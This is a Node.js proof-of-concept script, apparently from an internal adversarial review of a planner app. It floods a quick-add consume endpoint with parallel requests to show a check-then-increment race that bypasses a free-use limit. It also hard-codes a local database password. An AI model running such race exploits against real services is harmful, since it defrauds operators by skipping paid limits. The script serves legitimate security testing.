// TAB-02 §8/§12 TOCTOU race on /api/quick-add/consume.
// ConsumeAsync does read-check-increment with NO transaction/lock (BillingService.cs:63-69).
// Fire many parallel consume requests on a fresh user (FreeLimit=3) and see whether more
// than Limit succeed (limit skip) or the stored count disagrees with the number of 200s.
//
// Run: node adversarial-review/poc/02-quick-add/consume_race.mjs
import { execFileSync } from 'node:child_process'
import { provision, api } from '../_lib/provision.mjs'

const db = (sql) => execFileSync('docker', ['exec', 'planner-mysql', 'mysql', '-N', '-uplanner',
  '-pplanner_dev_password', 'planner', '-e', sql], { encoding: 'utf8' }).trim()

const tag = Math.random().toString(36).slice(2, 7)
const LIMIT = 3
const PARALLEL = 12

const u = await provision({ email: `adv.t02.race.${tag}@gmail.com`, gender: 'female' })
console.log(`=== TAB-02 consume TOCTOU race (FreeLimit=${LIMIT}, ${PARALLEL} parallel) ===`)
console.log(`user=${u.userId}`)

const results = await Promise.all(
  Array.from({ length: PARALLEL }, () => api('POST', '/api/quick-add/consume', { token: u.token })),
)
const n200 = results.filter((r) => r.status === 200).length
const n402 = results.filter((r) => r.status === 402).length
const stored = db(`SELECT QuickAddUsedCount FROM Users WHERE Id=${u.userId};`)

console.log(`\nHTTP 200 (allowed)=${n200}  HTTP 402 (blocked)=${n402}`)
console.log(`stored QuickAddUsedCount=${stored}  (expected == min(${PARALLEL},${LIMIT})=${Math.min(PARALLEL, LIMIT)})`)

const limitSkip = n200 > LIMIT
const lostIncrements = Number(stored) < n200
if (limitSkip) {
  console.log(`=> CONFIRMED limit SKIP: ${n200} uses allowed but limit is ${LIMIT} (free uses beyond the cap)`)
} else if (lostIncrements) {
  console.log(`=> CONFIRMED lost updates: ${n200} requests got 200 but only ${stored} counted (double-spend protection racey)`)
} else {
  console.log(`=> not reproduced this run (n200=${n200}, stored=${stored}); race is timing-dependent — rerun a few times`)
}
console.log('\n=== done ===')
